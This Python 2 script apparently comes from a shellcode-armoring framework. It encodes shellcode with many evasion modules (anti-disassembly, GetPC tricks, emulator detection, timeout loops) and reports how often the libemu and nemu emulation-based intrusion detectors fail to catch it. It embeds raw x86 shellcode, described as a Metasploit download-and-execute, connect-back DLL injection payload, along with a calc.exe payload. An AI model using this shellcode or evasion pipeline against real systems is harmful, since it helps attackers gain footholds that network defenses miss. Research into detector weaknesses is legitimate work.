#!/usr/bin/python

"""
For sanity-testing evasion payloads against libemu and nemu
"""

import argparse

from miasm2.arch.x86.arch import mn_x86

from arch.core import arch_registers, ctr_regs, architectures
from assembler.assembler import assembler
from assembler.disassembler import disassembler

# Payload
from calc_shellcode import calc_shellcode

# Encoders
from encoder_modules.poly_dword_xor import poly_dword_xor

# Evaders

# ===================
# Preprocessor
# ===================
# Anti-disassembly
from evasion_modules.preprocessor.antidisasm import evasion_antidisassembly

# ===================
# Heuristic
# ===================
# GetPC
# -------------------
from evasion_modules.heuristics.getpc.getpc_stackscan import evasion_getpc_stackscan
from evasion_modules.heuristics.getpc.getpc_stackconstruct import evasion_getpc_stackconstruct
# -------------------
# PRT
# -------------------
from evasion_modules.heuristics.prt.prt_relocator import evasion_prt_relocator
from evasion_modules.heuristics.prt.prt_stackconstructor import evasion_ptr_stackconstruct
# -------------------
# WX
# -------------------
from evasion_modules.heuristics.wx.wx_dualmap import evasion_wx_dualmap
# -------------------
# Egghunting
# -------------------
from evasion_modules.heuristics.egghunt.egghunt_api import evasion_egghunt_api

# ===================
# Emulator
# ===================
# Faithful emulation
from evasion_modules.emulator.faith.faith_fpu import evasion_faith_fpu
from evasion_modules.emulator.faith.faith_mmx import evasion_faith_mmx
from evasion_modules.emulator.faith.faith_sse import evasion_faith_sse
from evasion_modules.emulator.faith.faith_obsol import evasion_faith_obsol
# -------------------
# Emulator detection
# -------------------
from evasion_modules.emulator.detect.detect_libemu import evasion_detect_libemu
from evasion_modules.emulator.detect.detect_nemu_gp import evasion_detect_nemu_gp
from evasion_modules.emulator.detect.detect_nemu_cpuid import evasion_detect_nemu_cpuid
from evasion_modules.emulator.detect.detect_timing import evasion_detect_timing
# -------------------
# Timeout
# -------------------
from evasion_modules.emulator.timeout.timeout_loops import evasion_timeout_opaque_loop
from evasion_modules.emulator.timeout.timeout_loops import evasion_timeout_intensive_loop
from evasion_modules.emulator.timeout.timeout_loops import evasion_timeout_integrated_loop
from evasion_modules.emulator.timeout.timeout_rda import evasion_timeout_rda
# -------------------
# CKPE
# -------------------
from evasion_modules.emulator.ckpe.ckpe import evasion_ckpe_ckpe

# Evasion testing modules
from testing_modules.libemu_tester.libemu_tester import libemu_evasion_test
from testing_modules.nemu_tester.nemu_tester import nemu_evasion_test

class sanity_test:
	def __init__(self):
		return

	def encode_payload(self, arch, bits, e_option, payload, badchars):
		regs = arch_registers(arch, bits)

		# Counter register is blacklisted due to usage in subsequent decoding loops
		blacklist = [ctr_regs[bits]]

		# GetPC dest reg
		getpc_reg = regs.random_gp_reg(False, blacklist)

		# no reuse of getpc reg
		blacklist += [getpc_reg]

		# Key registry
		key_reg = regs.random_gp_reg(False, blacklist)

		# no reuse of key reg
		blacklist += [key_reg]

		# Encoder
		encoder = e_option['encoder'](payload)

		key_size = encoder.get_key_size()

		if 'key' in e_option['additional_params']:
			key = e_option['additional_params']['key']
		else:
			key = encoder.find_key(badchars)

		# Encoded payload
		enc = encoder.encode(key, badchars)

		# Evader
		evader = e_option['evader'](arch, bits, badchars)

		evader.set_encoded_payload(enc)
		evader.set_additional_params(e_option['additional_params'])

		# Key filler
		keyfiller_stub = evader.keyfiller_stub(key_reg, key)
		evader.set_keyfiller_stub(keyfiller_stub)

		# Decoder stub
		decoder_stub = encoder.decoder_stub(getpc_reg, key_reg, len(keyfiller_stub), arch, bits)
		evader.set_decoder_stub(decoder_stub)

		# GetPC stub
		getpc_stub = evader.getpc_stub(getpc_reg)
		stubs = getpc_stub + keyfiller_stub + decoder_stub

		# Prepend stubs to encoded payload
		encoded_payload = stubs + enc

		# Use evader's custom layer encoder when necessary (eg. for hash armoring, stack constructor, etc.)
		if(evader.has_layer_encoder()):
			encoded_payload = evader.encode(encoded_payload, badchars)

		return encoded_payload

	#
	# All evaders except kernel32.dll base resolution heuristic (which is a payload-integrated measure rather than an encoder-integrated one)
	#

	def get_encoded_payloads(self, arch, bits, payload, badchars):
		evasion = []

		evasion.append(('pre.anti_disassembly', {'evader': evasion_antidisassembly, 'encoder': poly_dword_xor, 'additional_params': {}}))
		
		evasion.append(('heur.getpc.stack_scan', {'evader': evasion_getpc_stackscan, 'encoder': poly_dword_xor, 'additional_params': {}}))
		evasion.append(('heur.getpc.stack_construct', {'evader': evasion_getpc_stackconstruct, 'encoder': poly_dword_xor, 'additional_params': {}}))

		evasion.append(('heur.prt.prt_reloc', {'evader': evasion_prt_relocator, 'encoder': poly_dword_xor, 'additional_params': {'os_version': 'WIN_7', 'service_pack': 'SP1', 'db_filename': './arch/syscall_db.sqlite'}}))
		evasion.append(('heur.prt.stack_construct', {'evader': evasion_ptr_stackconstruct, 'encoder': poly_dword_xor, 'additional_params': {}}))
		
		evasion.append(('heur.wx.dualmap', {'evader': evasion_wx_dualmap, 'encoder': poly_dword_xor, 'additional_params': {'os_version': 'WIN_7_ULTIMATE', 'service_pack': 'SP1', 'language_pack': 'EN', 'db_filename': './arch/dll_db.sqlite'}}))
		evasion.append(('heur.egghunt.api', {'evader': evasion_egghunt_api, 'encoder': poly_dword_xor, 'additional_params': {'egg_marker': "\xDE\xC0\xAD\x0B", 'os_version': 'WIN_7_ULTIMATE', 'service_pack': 'SP1', 'language_pack': 'EN', 'db_filename': './arch/dll_db.sqlite'}}))

		evasion.append(('emu.faith.fpu', {'evader': evasion_faith_fpu, 'encoder': poly_dword_xor, 'additional_params': {}}))
		evasion.append(('emu.faith.mmx', {'evader': evasion_faith_mmx, 'encoder': poly_dword_xor, 'additional_params': {}}))
		evasion.append(('emu.faith.sse', {'evader': evasion_faith_sse, 'encoder': poly_dword_xor, 'additional_params': {}}))
		evasion.append(('emu.faith.obsol', {'evader': evasion_faith_obsol, 'encoder': poly_dword_xor, 'additional_params': {}}))
		
		evasion.append(('emu.detect.libemu', {'evader': evasion_detect_libemu, 'encoder': poly_dword_xor, 'additional_params': {}}))
		evasion.append(('emu.detect.nemu_gp', {'evader': evasion_detect_nemu_gp, 'encoder': poly_dword_xor, 'additional_params': {}}))
		evasion.append(('emu.detect.nemu_cpuid', {'evader': evasion_detect_nemu_cpuid, 'encoder': poly_dword_xor, 'additional_params': {}}))
		evasion.append(('emu.detect.timing', {'evader': evasion_detect_timing, 'encoder': poly_dword_xor, 'additional_params': {}}))
		
		evasion.append(('emu.timeout.opaque_loop', {'evader': evasion_timeout_opaque_loop, 'encoder': poly_dword_xor, 'additional_params': {}}))
		evasion.append(('emu.timeout.intensive_loop', {'evader': evasion_timeout_intensive_loop, 'encoder': poly_dword_xor, 'additional_params': {}}))
		evasion.append(('emu.timeout.integrated_loop', {'evader': evasion_timeout_integrated_loop, 'encoder': poly_dword_xor, 'additional_params': {}}))

		#TODO: evasion_timeout_rda

		evasion.append(('emu.ckpe.ckpe', {'evader': evasion_ckpe_ckpe, 'encoder': poly_dword_xor, 'additional_params': {'ckpe_method': 'memaddress', 'ckpe_params': {'address': 0x00402000}, 'key': "\xDE\xAD\xBE\xEF"}}))

		enc_payloads = []

		for name, e_option in evasion:
			enc_payloads.append((name, self.encode_payload(arch, bits, e_option, payload, badchars)))

		return enc_payloads

	def libemu_sanity_check(self, arch, bits, payloads, firstTP=True):
		print "[*]Performing LIBEMU sanity check..."
		detected = 0

		libemu_test = libemu_evasion_test(arch, bits)

		# Is first payload a true positive check?
		if(firstTP):
			start_offset = 1
			total = len(payloads) - 1
			name, shellcode = payloads[0]
			status, offset, profile = libemu_test.getPC_Test(shellcode)

			print "[~]Sanity check shellcode (%s)" % name
			print "[~]Detected at offset %d" % offset
			print "[~]Profile:"
			print profile

			assert (status == True)
		else:
			start_offset = 0
			total = len(payloads)

		for i in xrange(start_offset, len(payloads)):
			name, shellcode = payloads[i]
			status, offset, profile = libemu_test.getPC_Test(shellcode)
			print "[*]Testing against shellcode encoded with [%s]" % name
			if(status):
				print "[!]Detected shellcode encoded with encoder [%s] at offset %d" % (name, offset)
				detected += 1

		print "[+]Finished LIBEMU sanity check!"
		return (((float(total)-float(detected))/float(total))*100)

	def nemu_sanity_check(self, arch, bits, payloads, firstTP=True):
		print "[*]Performing NEMU sanity check..."
		detected = 0
		nemu_test = nemu_evasion_test(arch, bits)

		if(firstTP):
			total = len(payloads) - 1
			start_offset = 1

			name, shellcode = payloads[0]
			status, starting_pos, shellcode_type, decrypted_shellcode = nemu_test.test(shellcode)

			print "[~]Sanity check shellcode (%s)" % name
			print "[~]Detected at offset %d" % starting_pos
			print "[~]Type [%s]" % shellcode_type
			print "[~]Decrypted shellcode:"
			print decrypted_shellcode

			assert (status == True)
		else:
			start_offset = 0
			total = len(payloads)

		for i in xrange(start_offset, len(payloads)):
			name, shellcode = payloads[i]
			status, starting_pos, shellcode_type, decrypted_shellcode = nemu_test.test(shellcode)
			print "[*]Testing against shellcode encoded with [%s]" % name
			if(status):
				print "[!]Detected shellcode encoded with encoder [%s] at offset %d" % (name, starting_pos)
				detected += 1

		print "[+]Finished NEMU sanity check!"
		return (((float(total)-float(detected))/float(total))*100)

	#
	# Scan file for shellcode using LIBEMU and NEMU
	#
	def scan_file(self, arch, bits, filename):
		libemu_test = libemu_evasion_test(arch, bits)
		nemu_test = nemu_evasion_test(arch, bits)

		file_contents = open(filename, "rb").read()

		libemu_status, libemu_offset, libemu_profile = libemu_test.getPC_Test(file_contents)
		nemu_status, nemu_offset, nemu_shellcode_type, nemu_decrypted_shellcode = nemu_test.test(file_contents)

		if(libemu_status):
			print "[!]LIBEMU detected shellcode at offset %d in file [%s]" % (libemu_offset, filename)
			print "[~]Profile:"
			print libemu_profile

			print "[Press any key to continue]"
			raw_input()

		if(nemu_status):
			print "[!]NEMU detected shellcode of type [%s] at offset %d in file [%s]" % (nemu_shellcode_type, nemu_offset, filename)
			print "[~]Decrypted shellcode:"
			print nemu_decrypted_shellcode

			print "[Press any key to continue]"
			raw_input()

		if not(libemu_status or nemu_status):
			print "[+]No shellcode detected in file [%s]" % filename

			print "[Press any key to continue]"
			raw_input()
		
		return

	#
	# Sanity test of full range of evaders (except payload-specifics such as base resolution heuristic evasion) against LIBEMU and NEMU
	#
	def full_sanity_test(self, architecture, bits, badchars):
		print "[*]Full sanity test:"
		print "[>]Shellcode payload: NEMU sanity test Download & Execute reflective DLL Injection (connect-back) payload from MSF"
		print "[>]Armor evaders: All except kernel32.dll heuristic evasion"

		# Wait for keypress
		print "[Press any key to continue]"
		raw_input()

		arch = architectures[architecture]

		# Download & Exec shellcode taken from NEMU sanity testing routines
		shellcode  = b"\xfc\x6a\xeb\x47\xe8\xf9\xff\xff\xff\x60\x31\xdb\x8b\x7d"
		shellcode += b"\x3c\x8b\x7c\x3d\x78\x01\xef\x8b\x57\x20\x01\xea\x8b\x34"
		shellcode += b"\x9a\x01\xee\x31\xc0\x99\xac\xc1\xca\x0d\x01\xc2\x84\xc0"
		shellcode += b"\x75\xf6\x43\x66\x39\xca\x75\xe3\x4b\x8b\x4f\x24\x01\xe9"
		shellcode += b"\x66\x8b\x1c\x59\x8b\x4f\x1c\x01\xe9\x03\x2c\x99\x89\x6c"
		shellcode += b"\x24\x1c\x61\xff\xe0\x31\xdb\x64\x8b\x43\x30\x8b\x40\x0c"
		shellcode += b"\x8b\x70\x1c\xad\x8b\x68\x08\x5e\x66\x53\x66\x68\x33\x32"
		shellcode += b"\x68\x77\x73\x32\x5f\x54\x66\xb9\x72\x60\xff\xd6\x95\x53"
		shellcode += b"\x53\x53\x53\x43\x53\x43\x53\x89\xe7\x66\x81\xef\x08\x02"
		shellcode += b"\x57\x53\x66\xb9\xe7\xdf\xff\xd6\x66\xb9\xa8\x6f\xff\xd6"
		shellcode += b"\x97\x68\xc0\xa8\x35\x14\x66\x68\x11\x5c\x66\x53\x89\xe3"
		shellcode += b"\x6a\x10\x53\x57\x66\xb9\x57\x05\xff\xd6\x50\xb4\x0c\x50"
		shellcode += b"\x53\x57\x53\x66\xb9\xc0\x38\xff\xe6"

		payloads = [("plain", shellcode)] + self.get_encoded_payloads(arch, bits, shellcode, badchars)

		libemu_rate = self.libemu_sanity_check(arch, bits, payloads)
		nemu_rate = self.nemu_sanity_check(arch, bits, payloads)

		print "[+]LIBEMU evasion success rate: %f%%" % libemu_rate
		print "[+]NEMU evasion success rate: %f%%" % nemu_rate

		if (int(libemu_rate) < 100):
			print "[-]LIBEMU evasion performed suboptimal"
		if (int(nemu_rate) < 84):
			print "[-]NEMU evasion performed suboptimal"
		if((int(libemu_rate) == 100) and (int(nemu_rate) >= 84)):
			print "[+]Test successful!"

		return

	#
	# Sanity test kernel32.dll base resolution heuristic bypass incorporating calc.exe popping shellcode using
	# random 1-depth evaders against target EBNIDS
	#
	def calc_shellcode_sanity_test(self, arch, bits, badchars):
		print "[*]Kernel32.dll base address resolution heuristic evasion sanity test:"
		print "[>]Shellcode payload: Universal Windows x86 calc.exe spawn by SkyLined & PFerrie"
		print "[>]Base heuristic evaders: seh walking, stack-frame walking"
		print "[>]Armor evaders: Randomly selected for target EBNIDs"

		# Wait for keypress
		print "[Press any key to continue]"
		raw_input()

		to_evade = ['libemu', 'nemu']
		approaches = ['peb', 'seh', 'stack_frame']
		cs_gen = calc_shellcode()

		for evade in to_evade:
			payloads = []

			# Non-armored payload versions
			non_armored = []
			for approach in approaches:
				name_chain, enc_p = cs_gen.build_shellcode(approach, arch, bits, badchars, False)
				assert(len(name_chain) == 0)
				payloads.append((approach+".no_armor", enc_p))

			# Armored payload versions
			armored = []
			for approach in approaches:
				name_chain, enc_p = cs_gen.build_shellcode(approach, arch, bits, badchars, True, [evade])
				name = approach+".evade_"+evade+(".[%s]" % ",".join(name_chain))
				payloads.append((name, enc_p))

			if(evade == 'libemu'):
				libemu_rate = self.libemu_sanity_check(architectures[arch], bits, payloads, False)
			elif(evade == 'nemu'):
				nemu_rate = self.nemu_sanity_check(architectures[arch], bits, payloads, True)

		print "[+]LIBEMU evasion success rate: %f%%" % libemu_rate
		print "[+]NEMU evasion success rate: %f%%" % nemu_rate

		if (int(libemu_rate) < 100):
			print "[-]LIBEMU evasion performed suboptimal"
		if (int(nemu_rate) < 100):
			print "[-]NEMU evasion performed suboptimal"
		if((int(libemu_rate) == 100) and (int(nemu_rate) == 100)):
			print "[+]Test successful!"

		return